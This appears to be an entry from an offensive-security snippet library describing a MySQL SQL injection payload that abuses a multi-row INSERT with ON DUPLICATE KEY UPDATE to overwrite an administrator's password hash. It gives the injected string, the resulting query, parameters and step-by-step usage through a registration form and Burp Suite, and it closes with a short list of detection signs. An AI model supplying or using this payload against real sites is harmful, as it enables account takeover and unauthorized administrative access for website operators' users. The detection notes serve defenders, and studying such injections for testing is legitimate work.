---
id: ea6766ac-4499-4e73-b010-f24ab1e2a1cd
name: MySQL-SQLi-ON-DUPLICATE-KEY-UPDATE-Admin-Password-Change
type: code
language: SQL
verified: true
created_at: '2023-04-06T03:56:36.647746+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Web
  - MySQL
tags:
  - SQL Injection
  - Payload
  - Password Update
validated: true
---

# MySQL-SQLi-ON-DUPLICATE-KEY-UPDATE-Admin-Password-Change

## Code

```sql
Inject using payload:
  attacker_dummy@example.com", "bcrypt_hash_of_qwerty"), ("admin@example.com", "bcrypt_hash_of_qwerty") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_qwerty" --

The query would look like this:
INSERT INTO users (email, password) VALUES ("attacker_dummy@example.com", "bcrypt_hash_of_qwerty"), ("admin@example.com", "bcrypt_hash_of_qwerty") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_qwerty" -- ", "bcrypt_hash_of_your_password_input");

This query will insert a row for the user “attacker_dummy@example.com”. It will also insert a row for the user “admin@example.com”.
Because this row already exists, the ON DUPLICATE KEY UPDATE keyword tells MySQL to update the `password` column of the already existing row to "bcrypt_hash_of_qwerty".

After this, we can simply authenticate with “admin@example.com” and the password “qwerty”!
```

## Description

This SQL code snippet is a payload for exploiting SQL injection in MySQL databases to change an admin password. It uses multi-row INSERT with ON DUPLICATE KEY UPDATE to create a dummy user and overwrite the admin's password hash in a single query, bypassing normal authentication flows.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| `bcrypt_hash_of_qwerty` | Hash of the desired new password (replace with actual bcrypt hash) | `$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi` |
| `attacker_dummy@example.com` | Dummy email for the non-duplicate insert | `dummy@attacker.com` |
| `admin@example.com` | Target admin email (must match existing unique key) | `admin@target.com` |

## Usage

Embed this payload into the email field of a vulnerable web form (e.g., registration POST request). Use a proxy like Burp Suite to modify the request body. After injection, log in with the admin email and corresponding plaintext password. Ideal for apps with unique email constraints and direct SQL concatenation.

## Detection

- Database query logs showing multi-row INSERTs with ON DUPLICATE KEY UPDATE from untrusted inputs.
- Anomalous password changes in audit logs without corresponding reset requests.
- WAF alerts for SQL keywords like 'INSERT', 'ON DUPLICATE', or comment sequences ('--').
- Failed login attempts followed by successful admin logins from unusual IPs.

## Related

- [[procedures/SQL-Injection-Admin-Password-Change-via-ON-DUPLICATE-KEY-UPDATE]]
- [[commands/mysql-inject-admin-password-update]]
